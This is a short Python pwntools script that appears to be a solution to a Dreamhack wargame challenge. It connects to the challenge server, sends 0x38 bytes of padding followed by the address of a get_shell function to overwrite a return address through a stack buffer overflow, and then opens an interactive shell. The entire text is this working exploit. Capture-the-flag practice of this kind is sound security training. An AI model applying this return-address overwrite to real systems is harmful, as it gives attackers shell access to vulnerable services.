from pwn import *

r = remote("host1.dreamhack.games", 15172)
get_shell = 0x004006aa

p = r.readuntil("Input:")
print(p)
payload = b"a"*0x30 + b"a"*8 + p64(get_shell)

r.sendline(payload)

r.interactive()